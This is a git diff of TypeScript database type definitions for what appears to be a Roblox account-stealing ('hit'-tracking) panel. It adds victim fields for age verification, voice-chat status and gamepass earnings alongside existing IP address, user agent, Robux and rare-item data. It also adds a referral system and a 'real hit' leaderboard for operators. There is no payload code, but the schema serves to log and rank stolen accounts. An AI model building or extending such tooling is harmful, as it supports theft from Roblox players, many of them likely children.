@@ -21,6 +21,8 @@ export type Database = {
           id: string
           ip_address: string | null
           owner_id: string
+          roblox_age_verified: boolean | null
+          roblox_gamepass_earnings: number | null
           roblox_has_headless: boolean | null
           roblox_has_korblox: boolean | null
           roblox_headshot_url: string | null
@@ -29,6 +31,7 @@ export type Database = {
           roblox_robux: number | null
           roblox_user_id: number | null
           roblox_username: string | null
+          roblox_voice_enabled: boolean | null
           tool_type: string
           user_agent: string | null
         }
@@ -38,6 +41,8 @@ export type Database = {
           id?: string
           ip_address?: string | null
           owner_id: string
+          roblox_age_verified?: boolean | null
+          roblox_gamepass_earnings?: number | null
           roblox_has_headless?: boolean | null
           roblox_has_korblox?: boolean | null
           roblox_headshot_url?: string | null
@@ -46,6 +51,7 @@ export type Database = {
           roblox_robux?: number | null
           roblox_user_id?: number | null
           roblox_username?: string | null
+          roblox_voice_enabled?: boolean | null
           tool_type: string
           user_agent?: string | null
         }
@@ -55,6 +61,8 @@ export type Database = {
           id?: string
           ip_address?: string | null
           owner_id?: string
+          roblox_age_verified?: boolean | null
+          roblox_gamepass_earnings?: number | null
           roblox_has_headless?: boolean | null
           roblox_has_korblox?: boolean | null
           roblox_headshot_url?: string | null
@@ -63,6 +71,7 @@ export type Database = {
           roblox_robux?: number | null
           roblox_user_id?: number | null
           roblox_username?: string | null
+          roblox_voice_enabled?: boolean | null
           tool_type?: string
           user_agent?: string | null
         }
@@ -88,6 +97,8 @@ export type Database = {
           created_at: string
           id: string
           login_key: string | null
+          referral_count: number
+          referred_by: string | null
           signup_webhook_url: string | null
           updated_at: string
           username: string
@@ -102,6 +113,8 @@ export type Database = {
           created_at?: string
           id: string
           login_key?: string | null
+          referral_count?: number
+          referred_by?: string | null
           signup_webhook_url?: string | null
           updated_at?: string
           username: string
@@ -116,6 +129,8 @@ export type Database = {
           created_at?: string
           id?: string
           login_key?: string | null
+          referral_count?: number
+          referred_by?: string | null
           signup_webhook_url?: string | null
           updated_at?: string
           username?: string
@@ -146,6 +161,8 @@ export type Database = {
         Row: {
           hit_count: number | null
           id: string | null
+          real_hit_count: number | null
+          referral_count: number | null
           total_rap: number | null
           total_robux: number | null
           username: string | null
